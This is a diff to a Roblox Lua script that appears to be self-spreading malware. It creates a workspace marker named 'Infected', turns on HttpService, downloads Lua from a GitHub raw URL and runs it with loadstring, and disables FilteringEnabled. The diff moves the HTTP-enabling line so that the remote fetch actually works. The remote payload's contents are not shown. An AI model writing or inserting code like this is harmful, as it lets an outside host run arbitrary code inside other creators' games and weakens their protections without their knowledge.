@@ -3,7 +3,8 @@ local infectionidentifier = Instance.new("BoolValue")
 infectionidentifier.Value = true
 infectionidentifier.Name = "Infected"
 infectionidentifier.Parent = workspace
-local code = game:HttpGet("https://raw.githubusercontent.com/neversic/test/main/test.lua")
+game:GetService("HttpService").HttpEnabled = true
+local code = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/neversic/test/main/test.lua")
 loadstring(code)()
 workspace.FilteringEnabled = false 
 local bodytype="R6"
@@ -401,7 +402,6 @@ function start()
 
 	-- StartGame--
 	game: GetService('RunService'):Run()
-	game:GetService("HttpService").HttpEnabled = true
 end
 
 
